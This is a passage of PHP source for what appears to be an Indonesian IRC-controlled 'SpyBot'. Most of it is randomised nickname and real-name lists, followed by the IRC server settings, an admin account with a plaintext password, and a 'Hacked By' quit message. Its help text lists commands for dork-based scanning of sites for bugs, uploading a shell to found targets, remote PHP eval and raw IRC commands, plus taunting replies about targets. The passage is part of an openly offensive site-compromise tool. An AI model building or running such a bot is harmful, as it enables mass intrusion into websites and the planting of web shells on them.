    "Oh",
    "O'hagan",
    "Oldford",
    "Olsen",
    "Olson", 
    "Olszewski",
    "O'malley",
    "Oman",
    "O'meara",
    "Opel",
    "Oray",
    "Oscaneld",
    "Orsi", 
    "Ospina",
    "Ostrowski",
    "Ottaviani",
    "Otten",
    "Ouchida",
    "Ovid",
    "PaesDealmeida",
    "Paine", 
    "Palayoor",
    "Palepu",
    "Pallara",
    "Palmitesta",
    "Panadero",
    "Panizzon",
    "Pantilla",
    "Paoletti", 
    "Parmeggiani",
    "Parris",
    "Partridge",
    "Pascucci",
    "Patefield",
    "Patrick",
    "Pattullo",
    "Pavetti", 
    "Pavlon",
    "Pawloski",
    "Paynter",
    "Peabody",
    "Pearlberg",
    "Pederson",
    "Peishel",
    "Penny", 
    "Pereira",
    "Perko",
    "Perlak",
    "Perlman",
    "Perna",
    "Perone",
    "Perrimon",
    "Peters",
    "Petruzello",
    "Pettibone",
    "Pettit",
    "Pfister",
    "Pilbeam",
    "Pinot",
    "Plancon",
    "Plant", 
    "Plasket",
    "Plous",
    "Pohh",
    "Pocobene",
    "Poincaire",
    "Pointer",
    "Poirier",
    "Polak",
    "Polanyi", 
    "Politis",
    "Poma",
    "Poolman",
    "Powers",
    "Presper",
    "Preucel",
    "Prevost",
    "Pritchard", 
    "Pritz",
    "Proietti",
    "Prothrow-Stith",
    "Puccia",
    "Pugh",
    "Pynchon",
    "Quaday",
    "Quetin", 
    "Rabe",
    "Rabkin",
    "Radeke",
    "Rajagopalan",
    "Raney",
    "Rangan",
    "Rankin",
    "Rapple",
    "Rayport",
    "Redden-Tyler",
    "Reedquist",
    "Cunningham",
    "Reinold",
    "Remak",
    "Renick",
    "Repetto", 
    "Resnik",
    "Rhea",
    "Richmond",
    "Rielly",
    "Rindos",
    "Rineer",
    "Rish",
    "Rivera",
    "Robinson", 
    "Rocha",
    "Roesler",
    "Rogers",
    "Ronen",
    "Row",
    "Roby",
    "Robert",
    "Royal",
    "Ru",
    "Ruan",
    "Ruderman",
    "Ruescher",
    "Rush",



    "Ryu",
    "Sabatello",
    "Sadler",
    "Safire", 
    "Sahu",
    "Sali",
    "Samson",
    "Sanchez-Ramirez",
    "Sanna",
    "Sapers",
    "Sarin",
    "Sartore", 
    "Sase",
    "Satin",
    "Satta",
    "Satterthwaite",
    "Sawtell",
    "Sayied",
    "Scarponi",
    "Scepan",
    "Scharf",
    "Scharlemann",
    "Scheiner",
    "Schiano",
    "Schifini",
    "Schilling",
    "Schmitt",
    "Schossberger", 
    "Schuman",
    "Schutte",
    "Schuyler",
    "Schwan",
    "Schwickrath",
    "Scovel",
    "Scudder",
    "Seaton", 
    "Seeber",
    "Segal",
    "Sekler",
    "Selvage",
    "Sen",
    "Sennett",
    "Seterdahl",
    "Sexton",
    "Seyfert",
    "Shaikh",
    "Shakis",
    "Shankland",
    "Shanley",
    "Shar",
    "Shatrov",
    "Shavelson",
    "Shea",
    "Sheats",
    "Shepherd",
    "Sheppard",
    "Shepstone",
    "Shesko",
    "Shia",
    "Shibata",
    "Shimon", 
    "Siesto",
    "Sigalot",
    "Sigini",
    "Signa",
    "Silverman",
    "Silvetti",
    "Sinsabaugh",
    "Sirilli", 
    "Sites",
    "Skane",
    "Skerry",
    "Skoda",
    "Sloan",
    "Slowe",
    "Smilow",
    "Sniffen",
    "Snodgrass", 
    "Socolow",
    "Solon",
    "Somers",
    "Sommariva",
    "Sorabella",
    "Sorg",
    "Sottak",
    "Soukup", 
    "Soule",
    "Soultanian",
    "Spanier",
    "Sparrow",
    "Spaulding",
    "Speizer",
    "Spence",
    "Sperber", 
    "Spicer",
    "Spiegelhalter",
    "Spiliotis",
    "Spinrad",
    "StMartin",
    "Stalvey",
    "Stam",
    "Stang", 
    "Stassinopolus",
    "States",
    "Statlender",
    "Stefani",
    "Steiner",
    "Stephanian",
    "Stepniewska",
    "Stewart-Oaten", 
    "Stiepock",
    "Stillwell",
    "Stock",
    "Stockton",
    "Stockwell",
    "Stolzenberg",
    "Stonich",
    "Storer", 
    "Stott",
    "Strange",
    "Strauch",
    "Streiff",
    "Stringer",
    "Sullivan",
    "Sumner",
    "Suo",
    "Surdam",
    "Sweeting",
    "Sweetser",
    "Swindle",
    "Tagiuri",
    "Tai",
    "Talaugon",
    "Tambiah",
    "Tandler",
    "Tanowitz",
    "Tatar",
    "Taveras",
    "Tawn",
    "Tcherepnin",
    "Teague",
    "Temes",
    "Temmer", 
    "Tenney",
    "Terracini",
    "Than",
    "Thavaneswaran",
    "Theodos",
    "Thibault",
    "Thisted",
    "Thomsen", 
    "Throop",
    "Tierney",
    "Till",
    "Timmons",
    "Tofallis",
    "Tollestrup",
    "Tolls",
    "Tolman", 
    "Tomford",
    "Toomer",
    "Topulos",
    "Torresi",
    "Torske",
    "Towler",
    "Toye",
    "Traebert",
    "Trenga",
    "Trewin",
    "Tringali",
    "Troiani",
    "Troy",
    "Truss",
    "Tsiatis",
    "Tsomides",
    "Tsukurov", 
    "Tuck",
    "Tudge",
    "Tukan",
    "Turano",
    "Turek",
    "Tuttle",
    "Twells",
    "Tzamarias",
    "Ullman", 
    "Untermeyer",
    "Upsdell",
    "Urban",
    "Urdang-Brown",
    "Usdan",
    "Uzuner",
    "Vacca",
    "Waite", 
    "Valberg",
    "Valencia",
    "Wales",
    "Wallenberg",
    "Walter",
    "vanAllen",
    "VanZwet",
    "Vandenberg", 
    "Vanheeckeren",
    "Warshafsky",
    "Wasowska",
    "Vasquez",
    "Waugh",
    "Weighart",
    "Weingarten",
    "Weinhaus", 
    "Weissbourd",
    "Weissman",
    "Velasquez",
    "Welles",
    "Welsh",
    "Wengret",
    "Venne",
    "Verghese", 
    "Wescott",
    "Wetzel",
    "Whately",
    "Whilton",
    "White",
    "Whitla",
    "Whittaker",
    "Viana", 
    "Viano",
    "Wiedersheim",
    "Wiener",
    "Viens",
    "Vignola",
    "Wilder",
    "Wilhelm",
    "Wilk",
    "Wilkin", 
    "Wilkinson",
    "Villarreal",
    "Willstatter",
    "Wilson",
    "Vitali",
    "Viviani",
    "Voigt",
    "Wolk", 
    "VonHoffman",
    "Woo",
    "Wooden",
    "Woods",
    "Woods-Powell",
    "Vorhaus",
    "Votey",
    "Vortex",
    "xixet",
    "xman",
    "Yacono", 
    "Yamane",
    "Yankee",
    "Yarchuk",
    "Yates",
    "Ybarra",
    "Yedidia",
    "Yesson",
    "Yetiv",
    "Yoffe", 
    "Yoo",
    "Youk-See",
    "Yu",
    "Zachary",
    "Zahedi",
    "Zangwill",
    "Zegans",
    "Zerbini",
    "Zoldak", 
    "DeFaCE`",
    "XuMblieR"
);
$namabot = array(
"CageModel", 
    "CalmeCute",
    "CameSiniDonksay",
    "CamKuinirusak",
    "Canley",
    "Capanni",
    "Caperton",
    "Capocaccia",
    "Capodilupo", 
    "Cappuccio",
    "Capursi",
    "Caratozzolo",
    "Carayannopoulos",
    "Carlin",
    "Carlos",
    "Carlyle",
    "Carmichael", 
    "Caroti",
    "Carper",
    "Cartmill",
    "Cascio",
    "Case",
    "Caspar",
    "Castelda",
    "Cavanagh", 
    "Cavell",
    "Ceniceros",
    "Cerioli",
    "Chapman",
    "Charles",
    "Cheang",
    "Cherry",
    "Chervinsky", 
    "Chiassino",
    "Chien",
    "Childress",
    "Childs",
    "Chinipardaz",
    "Chinman",
    "Christenson",
    "Christian", 
    "Christiano",
    "Christie",
    "Christopher",
    "ChuPuZ",
    "Chupasko",
    "Church",
    "Ciampaglia",
    "Cicero", 
    "Cifarelli",
    "Claffey",
    "Clancy",
    "Clark",
    "Clement",
    "Clifton",
    "Clow",
    "Coblenz", 
    "Coito",
    "Coldren",
    "Colella",
    "Collard",
    "Collis",
    "Compton",
    "Compton",
    "Comstock",
    "Concino",
    "Condodina",
    "Connors",
    "Corey",
    "Cornish",
    "Cosmides",
    "Counter",
    "Coutaux", 
    "Crawford",
    "Crocker",
    "Croshaw",
    "Croxen",
    "Croxton",
    "Cui",
    "Currier",
    "Cutler",
    "Cvek",
    "Cyders",
    "daSilva",
    "Daldalian",
    "Daly",
    "D'Ambra",
    "Danieli",
    "Dante",
    "Dapice",
    "D'arcangelo",
    "Das",
    "Dasgupta",
    "Daskalu",
    "David",
    "Dawkins",
    "DeGennaro", 
    "DeLaPena",
    "del'Enclos",
    "deRousse",
    "Debroff",
    "Dees",
    "Defeciani",
    "Delattre",
    "Deleon-Rendon", 
    "Delger",
    "Dell'acqua",
    "Deming",
    "Dempster",
    "Demusz",
    "Denault",
    "Denham",
    "Denison", 
    "Desombre",
    "Deutsch",
    "D'fini",
    "Dicks",
    "Diefenbach",
    "Difabio",
    "Difronzo",
    "Dilworth", 
    "Dionysius",
    "Dirksen",
    "Dockery",
    "Doherty",
    "Donahue",
    "Donner",
    "Doonan",
    "Dore", 
    "Dorf",
    "Dosi",
    "Doty",
    "Doug",
    "Dowsland",
    "Drinker",
    "D'souza",
    "Duffin",
    "Durrett", 
    "Dussault",
    "Dwyer",
    "Eardley",
    "Ebeling",
    "Eckel",
    "Edley",
    "Edner",
    "Edward",
    "Eickenhorst", 
    "Eliasson",
    "Elmendorf",
    "Elmerick",
    "Elvis",
    "Encinas",
    "Enyeart",
    "Eppling",
    "Erbach", 
    "Erdman",
    "Erdos",
    "Erez",
    "Espinoza",
    "Estes",
    "Etter",
    "Euripides",
    "Everett",
    "Fabbris",
    "Fagan",
    "Faioes",
    "Falco-Acosta",
    "Falorsi",
    "Faris",
    "Farone",
    "Farren",
    "Fasso'",
    "Fates",
    "Feigenbaum",
    "Fejzo",
    "Feldman",
    "Fernald",
    "Fernandes",
    "Ferrante", 
    "Ferriell",
    "Feuer",
    "Fido",
    "Field",
    "Fink",
    "Finkelstein",
    "Finnegan",
    "Fiorina", 
    "Fisk",
    "Fitzmaurice",
    "Flier",
    "Flores",
    "Folks",
    "Forester",
    "Fortes",
    "Fortier",
    "Fossey", 
    "Fossi",
    "Francisco",
    "Franklin-Kenea",
    "Franz",
    "Frazier-Davis",
    "Freid",
    "Freundlich",
    "Fried", 
    "Friedland",
    "Frisken",
    "Frowiss",
    "Fryberger",
    "Frye",
    "Fujii-Abe",
    "Fuller",
    "Furth", 
    "Fusaro",
    "Gabrielli",
    "Gaggiotti",
    "Galeotti",
    "Galwey",
    "Gambini",
    "Gascaneld",
    "Garman", 
    "Garonna",
    "Geller",
    "Gemberling",
    "Georgi",
    "Gerrett",
    "Ghorai",
    "Gibbens",
    "Gibson", 
    "Gilbert",
    "Gili",
    "Gill",
    "Gillispie",
    "Gist",
    "Gleason",
    "Glegg",
    "Glendon",
    "Goldfarb", 
    "Goncalves",
    "Good",
    "Goodearl",
    "Goody",
    "Gozzi",
    "Gravell",
    "Greenberg",
    "Greenfeld", 
    "Griffiths",
    "Grigoletto",
    "Grummell",
    "Gruner",
    "Gruppe",
    "Guenthart",
    "Gunn",
    "Guo", 
    "Ha",
    "Haar",
    "Hackman",
    "Hackshaw",
    "Haley",
    "Halkias",
    "Hallowell",
    "Halpert",
    "Hambarzumjan",
    "Hamer",
    "Hammerness",
    "Hand",
    "Hanssen",
    "Harding",
    "Hargraves",
    "Harlow", 
    "Harrigan",
    "Hartman",
    "Hartmann",
    "Hartnett",
    "Harwell",
    "Haviaras",
    "Hawkes",
    "Hayes", 
    "Haynes",
    "Hazlewood",
    "Heermans",
    "Heft",
    "Heiland",
    "Hellman",
    "Hellmiss",
    "Helprin", 
    "Hemphill",
    "Henery",
    "Henrichs",
    "Hernandez",
    "Herrera",
    "Hester",
    "Heubert",
    "Heyeck", 
    "Himmelfarb",
    "Hind",
    "Hirst",
    "Hitchcock",
    "Hoang",
    "Hock",
    "Hoffer",
    "Hoffman",
    "Hokanson",
    "Hokoda",
    "Holmes",
    "Holoien",
    "Holter",
    "Holway",
    "Holzman",
    "Hooker",
    "Hopkins", 
    "Horsley",
    "Hoshida",
    "Hostage",
    "Hottle",
    "Howard",
    "Hoy",
    "Huey",
    "Huidekoper",
    "Hungerford",
    "Huntington",
    "Hupp",
    "Hurtubise",
    "Hutchings",
    "Hyde",
    "Iaquinta",
    "Ichikawa", 
    "Igarashi",
    "Inamura",
    "Inniss",
    "Isaac",
    "Isaievych",
    "Isbill",
    "Isserman",
    "Iyer", 
    "Jacenko",
    "Jackson",
    "Jagers",
    "Jagger",
    "Jagoe",
    "Jain",
    "Jamil",
    "Janjigian",
    "Jarnagin",
    "Jarrell",
    "Jay",
    "Jeffers",
    "Jellis",
    "Jenkins",
    "Jespersen",
    "Jewett",
    "Johannesson",
    "Johannsen",
    "Johns",
    "Jolly",
    "Jorgensen",
    "Jucks",
    "Juliano",
    "Julious", 
    "Kabbash",
    "Kaboolian",
    "Kafadar",
    "Kalbfleisch",
    "Kaligian",
    "Kalil",
    "Kalinowski",
    "Kalman", 
    "Kamel",
    "Kangis",
    "Karpouzes",
    "Kassower",
    "Kasten",
    "Kawachi",
    "Kee",
    "Keenan",
    "Keepper",
    "Keith",
    "Kelker",
    "Kelsey",
    "Kempton",
    "Kemsley",
    "Kendall",
    "Kerry",
    "Keul", 
    "Khong",
    "Kimmel",
    "Kimmett",
    "Kimura",
    "Kindall",
    "Kinsley",
    "Kippenberger",
    "Kirscht", 
    "Kittridge",
    "Kleckner",
    "Kleiman",
    "Kleinfelder",
    "Klemperer",
    "Kling",
    "Klinkenborg",
    "Klint", 
    "Knuff",
    "Kobrick",
    "Koch",
    "Kohn",
    "Koivumaki",
    "Kommer",
    "Koniaris",
    "Konrad",
    "Kool",
    "Korzybski",
    "Kotter",
    "Kovaks",
    "Kraemer",
    "Krailo",
    "Krasney",
    "Kraus",
    "Kroemer", 
    "Krysiak",
    "Kuenzli",
    "Kumar",
    "Kusman",
    "Kuwabara",
    "La",
    "Labunka",
    "Lafler",
    "Laing", 
    "Lallemant",
    "Landes",
    "Lankes",
    "Lantieri",
    "Lanzit",
    "Laserna",
    "Lashley",
    "Lawless", 
    "Lecar",
    "Lecce",
    "Leclercq",
    "Leite",
    "Lenard",
    "l'Enclos",
    "Lesser",
    "Lessi", 
    "Liakos",
    "Lidano",
    "Liem",
    "Light",
    "Lightfoot",
    "Lim",
    "Linares",
    "Linda",
    "Linder", 
    "Line",
    "Linehan",
    "Linzee",
    "Lippmann",
    "Lipponen",
    "Little",
    "Litvak",
    "Livernash", 
    "Livi",
    "Livolsi",
    "Lizardo",
    "Locatelli",
    "Longworth",
    "Lossthelok",
    "Loveman",
    "Lowenstein", 
    "Lozak",
    "Lubin",
    "Lucas",
    "Luciano",
    "Luczkow",
    "Luecke",
    "Lunetta",
    "Luoma",
    "Lussier", 
    "Lutcavage",
    "Luzader",
    "MaSakSendiri",
    "Maccormac",
    "Macdonald",
    "Maceachern",
    "Macintyre",
    "Mackenney", 
    "MacMillan",
    "Macyh",
    "Madigan",
    "Maggio",
    "Mahony",
    "Maier",
    "Maine-Hershey",
    "Maisano", 
    "Malatesta",
    "Maller",
    "Malova",
    "Manalis",
    "Mandel",
    "Manganiello",
    "Mantovan",
    "March", 
    "Marchbanks",
    "Marcus",
    "Margalit",
    "Margetts",
    "Marques",
    "Martinez",
    "Martochio",
    "Marton", 
    "Marubini",
    "Massih",
    "Matalka",
    "Matarazzo",
    "Matsukata",
    "Mattson",
    "Mauzy",
    "Maysaro", 
    "Mazzali",
    "Mazziotta",
    "Mcbride",
    "Mccaffery",
    "Mccall",
    "Mcclearn",
    "Mcdowell",
    "Mcelroy", 
    "McFadden",
    "Mcghee",
    "Mcgoldrick",
    "McIlroy",
    "Mcintosh",
    "Mckenna",
    "Mclane",
    "Mclaren", 
    "Mcnealy",
    "Mcnulty",
    "Meccariello",
    "Memisoglu",
    "Menzies",
    "Merikoski",
    "Merlani",
    "Merminod", 
    "Merseth",
    "Merz",
    "Metelka",
    "Metropolis",
    "Meurer",
    "Michelman",
    "Middle",
    "Mieher", 
    "Mills",
    "Minh",
    "Mini",
    "Minichiello",
    "Gonzalez",
    "Mitropoulos",
    "Mittal",
    "Mocroft", 
    "Modestino",
    "Moeller",
    "Mohr",
    "Moiamedi",
    "Monque",
    "Montilio",
    "MooreDeCh.",
    "Morani", 
    "Moreton",
    "Morrison",
    "Morrow",
    "Mortimer",
    "Mosher",
    "Mosler",
    "Mostafavi",
    "Motooka", 
    "Mudarri",
    "Muello",
    "Mugnai",
    "Mulkern",
    "Mulroy",
    "Mumford",
    "Mussachio",
    "Naddeo", 
    "Napolitano",
    "Nardi",
    "Nardone",
    "Naviaux",
    "Nayduch",
    "Nelson",
    "Nenna",
    "Nesci", 
    "Neuman",
    "Newfeld",
    "Newlin",
    "Ng",
    "Ni",
    "Nickerson",
    "Nickoloff",
    "Nisenson",
    "Nitabach", 
    "Notman",
    "Nuzum",
    "Ocougne",
    "Ogata",
    "Oh",
    "O'hagan",
    "Oldford",
    "Olsen",
    "Olson", 
    "Olszewski",
    "O'malley",
    "Oman",
    "O'meara",
    "Opel",
    "Oray",
    "Oscaneld",
    "Orsi", 
    "Ospina",
    "Ostrowski",
    "Ottaviani",
    "Otten",
    "Ouchida",
    "Ovid",
    "PaesDealmeida",
    "Paine", 
    "Palayoor",
    "Palepu",
    "Pallara",
    "Palmitesta",
    "Panadero",
    "Panizzon",
    "Pantilla",
    "Paoletti", 
    "Parmeggiani",
    "Parris",
    "Partridge",
    "Pascucci",
    "Patefield",
    "Patrick",
    "Pattullo",
    "Pavetti", 
    "Pavlon",
    "Pawloski",
    "Paynter",
    "Peabody",
    "Pearlberg",
    "Pederson",
    "Peishel",
    "Penny", 
    "Pereira",
    "Perko",
    "Perlak",
    "Perlman",
    "Perna",
    "Perone",
    "Perrimon",
    "Peters",
    "Petruzello",
    "Pettibone",
    "Pettit",
    "Pfister",
    "Pilbeam",
    "Pinot",
    "Plancon",
    "Plant", 
    "Plasket",
    "Plous",
    "Pohh",
    "Pocobene",
    "Poincaire",
    "Pointer",
    "Poirier",
    "Polak",
    "Polanyi", 
    "Politis",
    "Poma",
    "Poolman",
    "Powers",
    "Presper",
    "Preucel",
    "Prevost",
    "Pritchard", 
    "Pritz",
    "Proietti",
    "Prothrow-Stith",
    "Puccia",
    "Pugh",
    "Pynchon",
    "Quaday",
    "Quetin", 
    "Rabe",
    "Rabkin",
    "Radeke",
    "Rajagopalan",
    "Raney",
    "Rangan",
    "Rankin",
    "Rapple",
    "Rayport",
    "Redden-Tyler",
    "Reedquist",
    "Cunningham",
    "Reinold",
    "Remak",
    "Renick",
    "Repetto", 
    "Resnik",
    "Rhea",
    "Richmond",
    "Rielly",
    "Rindos",
    "Rineer",
    "Rish",
    "Rivera",
    "Robinson", 
    "Rocha",
    "Roesler",
    "Rogers",
    "Ronen",
    "Row",
    "Roby",
    "Robert",
    "Royal",
    "Ru",
    "Ruan",
    "Ruderman",
    "Ruescher",
    "Rush",
    "Ryu",
    "Sabatello",
    "Sadler",
    "Safire", 
    "Sahu",
    "Sali",
    "Samson",
    "Sanchez-Ramirez",
    "Sanna",
    "Sapers",
    "Sarin",
    "Sartore", 
    "Sase",
    "Satin",
    "Satta",
    "Satterthwaite",
    "Sawtell",
    "Sayied",
    "Scarponi",
    "Scepan",
    "Scharf",
    "Scharlemann",
    "Scheiner",
    "Schiano",
    "Schifini",
    "Schilling",
    "Schmitt",
    "Schossberger", 
    "Schuman",
    "Schutte",
    "Schuyler",
    "Schwan",
    "Schwickrath",
    "Scovel",
    "Scudder",
    "Seaton", 
    "Seeber",
    "Segal",
    "Sekler",
    "Selvage",
    "Sen",
    "Sennett",
    "Seterdahl",
    "Sexton",
    "Seyfert",
    "Shaikh",
    "Shakis",
    "Shankland",
    "Shanley",
    "Shar",
    "Shatrov",
    "Shavelson",
    "Shea",
    "Sheats",
    "Shepherd",
    "Sheppard",
    "Shepstone",
    "Shesko",
    "Shia",
    "Shibata",
    "Shimon", 
    "Siesto",
    "Sigalot",
    "Sigini",
    "Signa",
    "Silverman",
    "Silvetti",
    "Sinsabaugh",
    "Sirilli", 
    "Sites",
    "Skane",
    "Skerry",
    "Skoda",
    "Sloan",
    "Slowe",
    "Smilow",
    "Sniffen",
    "Snodgrass", 
    "Socolow",
    "Solon",
    "Somers",
    "Sommariva",
    "Sorabella",
    "Sorg",
    "Sottak",
    "Soukup", 
    "Soule",
    "Soultanian",
    "Spanier",
    "Sparrow",
    "Spaulding",
    "Speizer",
    "Spence",
    "Sperber", 



    "Spicer",
    "Spiegelhalter",
    "Spiliotis",
    "Spinrad",
    "StMartin",
    "Stalvey",
    "Stam",
    "Stang", 
    "Stassinopolus",
    "States",
    "Statlender",
    "Stefani",
    "Steiner",
    "Stephanian",
    "Stepniewska",
    "Stewart-Oaten", 
    "Stiepock",
    "Stillwell",
    "Stock",
    "Stockton",
    "Stockwell",
    "Stolzenberg",
    "Stonich",
    "Storer", 
    "Stott",
    "Strange",
    "Strauch",
    "Streiff",
    "Stringer",
    "Sullivan",
    "Sumner",
    "Suo",
    "Surdam",
    "Sweeting",
    "Sweetser",
    "Swindle",
    "Tagiuri",
    "Tai",
    "Talaugon",
    "Tambiah",
    "Tandler",
    "Tanowitz",
    "Tatar",
    "Taveras",
    "Tawn",
    "Tcherepnin",
    "Teague",
    "Temes",
    "Temmer", 
    "Tenney",
    "Terracini",
    "Than",
    "Thavaneswaran",
    "Theodos",
    "Thibault",
    "Thisted",
    "Thomsen", 
    "Throop",
    "Tierney",
    "Till",
    "Timmons",
    "Tofallis",
    "Tollestrup",
    "Tolls",
    "Tolman", 
    "Tomford",
    "Toomer",
    "Topulos",
    "Torresi",
    "Torske",
    "Towler",
    "Toye",
    "Traebert",
    "Trenga",
    "Trewin",
    "Tringali",
    "Troiani",
    "Troy",
    "Truss",
    "Tsiatis",
    "Tsomides",
    "Tsukurov", 
    "Tuck",
    "Tudge",
    "Tukan",
    "Turano",
    "Turek",
    "Tuttle",
    "Twells",
    "Tzamarias",
    "Ullman", 
    "Untermeyer",
    "Upsdell",
    "Urban",
    "Urdang-Brown",
    "Usdan",
    "Uzuner",
    "Vacca",
    "Waite", 
    "Valberg",
    "Valencia",
    "Wales",
    "Wallenberg",
    "Walter",
    "vanAllen",
    "VanZwet",
    "Vandenberg", 
    "Vanheeckeren",
    "Warshafsky",
    "Wasowska",
    "Vasquez",
    "Waugh",
    "Weighart",
    "Weingarten",
    "Weinhaus", 
    "Weissbourd",
    "Weissman",
    "Velasquez",
    "Welles",
    "Welsh",
    "Wengret",
    "Venne",
    "Verghese", 
    "Wescott",
    "Wetzel",
    "Whately",
    "Whilton",
    "White",
    "Whitla",
    "Whittaker",
    "Viana", 
    "Viano",
    "Wiedersheim",
    "Wiener",
    "Viens",
    "Vignola",
    "Wilder",
    "Wilhelm",
    "Wilk",
    "Wilkin", 
    "Wilkinson",
    "Villarreal",
    "Willstatter",
    "Wilson",
    "Vitali",
    "Viviani",
    "Voigt",
    "Wolk", 
    "VonHoffman",
    "Woo",
    "Wooden",
    "Woods",
    "Woods-Powell",
    "Vorhaus",
    "Votey",
    "Vortex",
    "xixet",
    "xman",
    "Yacono", 
    "Yamane",
    "Yankee",
    "Yarchuk",
    "Yates",
    "Ybarra",
    "Yedidia",
    "Yesson",
    "Yetiv",
    "Yoffe", 
    "Yoo",
    "Youk-See",
    "Yu",
    "Zachary",
    "Zahedi",
    "Zangwill",
    "Zegans",
    "Zerbini",
    "Zoldak", 
    "DeFaCE`",
    "XuMblieR"
);
/*** Server IRC ***/
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else { $remotehost2 = array("irc.allnetwork.org"); }
$port = "6667";
$quitmsglist = array("Hacked By.ribbon-cola");

/*** Admin ***/
$admin = 'ribbon-cola';
$bot_password = 'listi'; //Password untuk auth bot

$judul = "4tequilla hacker community";

$helptext = array(
"",
"3,9/9,3\0,1 ? 4Van-Persie hacker community $versi Help ? 3,9/9,3\",
"-",
"12auth <password> - Login ke bot",
"12deauth - Logout dari bot",
"12pass <password> - Mengeset password bot",
"12chgpass <passlama> <passbaru> - Mengganti password bot",
"12adduser <nick> <master|user> - Menambah master/user bot",
"12deluser <nick> - Menghapus master/user bot",
"12`auth - Status anda di channel (Channel)",
"12!auth - Status otorisasi anda",
"12!act <text> - Bot action (Channel)",
"12!slap <nick> - Slap nick (Channel)",
"12!msg <chan|nick> <pesan> - Mengirim pesan",
"12!notice <chan|nick> <pesan> - Mengirim notice",
"12!ctcp <chan|nick> <ctcptext> - Request CTCP",
"12!ping - Meminta bot untuk membalas dg pong (Channel)",
"12!up - Meminta bot untuk menjadi @ di channel (Channel)",
"12!down - Meminta bot untuk turun dari @ di channel (Channel)",
"12!cycle <channel> <pesan> - Hop di channel (Channel) (Admin/Master)",
"12!join <channel> - Join channel (Admin/Master)",
"12!part [channel] [alasan] - Part dari channel (Admin)",
"12!botnick <nick> <passwordnick> - Ganti nick (Admin/Master)",
"12!k <nick> - Kick nick (Channel)",
"12!kb <nick> - Kick ban nick (Channel)",
"12!changenick - Ganti nick ke nick internal",
"12!op <nick1> [nick2] [nick3] - Op (Channel)",
"12!deop <nick1> [nick2] [nick3] - Deop (Channel)",
"12!v <nick1> [nick2] [nick3] - voice (Channel)",
"12!dv <nick1> [nick2] [nick3] - Devoice (Channel)",
"12!away [alasan] - Meminta nick untuk Away",
"12!mode <flags> <chan|nick> - Mengubah Mode (Channel)",
"12!nickmode <flags> - Mengeset user mode",
"12!chanlist - Melihat daftar channel bot",
"12!userlist - Melihat daftar user",
"12!quit [pesan] - Quit dari IRC (Admin)",
"12!vhost [vhost] - Mengganti Vhost",
"12!jump [server] - Mengganti Server bot",
"12!fullname [nama] - Mengganti Fullname bot",
"12!topic <topik> - Mengganti topik channel (Channel)",
"12!help - Melihat help (Query)",
"4.: Public Commands :.",
"12!urlenc <url> | !urldec <url> - URL Encoder/Decoder",
"12!b64enc <url> | !b64dec <url> - Base64 Encoder/Decoder",
"12!tes <target> - Melihat info target",
"4.: Core Commands :.",
"12!start - Mengaktifkan SpyBot",
"12!stop - Menonaktifkan SpyBot",
"12!scan <bug> <dork> - Menscan di channel Scanner",
"12!scan <add|del|list> <text> - Menambah/menghapus/melihat daftar Scan Trigger",
"12!ignore <text> - Menambah daftar Ignore",
"12!delignore <text> - Menghapus daftar Ignore",
"12!ignorelist - Melihat daftar ignore",
"12!ganti <text> - Menambah daftar inject yg akan diganti",
"12!delganti <text> - Menghapus daftar Ganti",
"12!gantilist - Melihat daftar inject yg diganti",
"12!tanam <target> - Mengupload shell ke target (Admin/Master)",
"12!status - Melihat status sekarang",
"4.: Admin Core Commands :.",
"12!target <list|clear|log|total> <nick|chan> - Target yg ditemukan oleh bot",
"12!raw <url> - Mengirim RAW IRC Command",
"12!eval <url> - Mengeksekusi kode PHP pada Bot",
"-",
"3,9/9,3\0,1 ? By.Van-Persie - #kota-blitar @ irc.allnetwork.org ? 3,9/9,3\",
);

$tjelek = array(
"Jangan Di Ambil.. <s>",
"<s> <- Lebih Buruk...",
"Duh..! <s> Membosankan..",
"Hem..Ada <s>",
"Weeww!? <s>",
"<s> <-- BuKaN TarGeTz ;p",
"kwkwkkw.. <s>",
"<s> Bau Neh..",
"Brukss..!! <s>",
"HUuuu.. <s>",
"<s> masuk jg? Ngawur..",
"HanDeeh..<s> kamu liat ga keliatan..",
"Jiakaka.. <s> lagi deh",
"Ga da yg lain apa? kok <s> terus sich?",
);
$tnemu = array(
"0,12 [attack one] 12,0 <s>",
"0,12 [attack two] 12,0 <s>",
"0,12 [good!!] 12,0 <s>",
"0,12 [attack good..!!] 12,0 <s>",
"0,12 [very good..] 12,0 <s>",
"0,12 [attack..] 12,0 <s>",
"0,12 [attack goo..!] 12,0 <s>",
"0,12 [good.. good!!] 12,0 <s>",
"0,12 [okay!!] 12,0 <s>",
);
$tlama = array(
"0,14 [old target..] 14,0 <s>",
"0,14 [old target one..] 14,0 <s>",
"0,14 [old target two..] 14,0 <s>",
"0,14 [old target tree..] 14,0 <s>",
"0,14 [last target..] 14,0 <s>",
"0,14 [Ups....] 14,0 <s>",
"0,14 [Injury time..] 14,0 <s>",
);
$tbusuk = array(
"Stop <n>!! ijino sek nang mas Van-Persie..",
"Stop!! Masih Tetap gak ngaceng.. <n>..",
"<n> hehehhe goblock koen..?",
"Xixixi.. target <n> dah jelbut..",
"<n>, sepertinya koen palang..",
"gendeng koen <n>!",
"nyecan dulu kono..! ojo di gae neh <n>?",
"busett.. <n> kamu dapet,alias EM.. xixixi..",
"Wedew.. <n>! Ntu bukan target namanya tp situs bokep..",
"brb seg kepingkel aquw.. , <n>!",
"aduso sek <n> ambumu ora enak",
"ngengkel ae <n>! uduk target aquw..",
"Silahkan menemani om Djavu dulu nyecan  <n>!",
"<n>.. hubungi om Van-Persie dulu..",
"Targetmu mambu pokeh .. <n>",
"Percuma.. om Van-Persie gak kasih km ijin, <n>!",
"megelno <n> iki mententeng ae dadi..",
" <n>, ojo onani ae targetmu amies..",
);

/*** Replacement ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$realname = $namabot[rand(0,count($namabot) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$changue = strtolower($changue);
$admin = strtolower($admin);
$auth = array(
$admin => array("name" => $admin,"pass" => $bot_password,"auth" => 1,"status" => "Admin")
);
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
/*** Inisialisasi Variabel ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$targetfound = 0;
$targetignored = 0;
$targetnew = 0;
$targetold = 0;
$statusdelay = 0;
$allowdebug = FALSE;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);
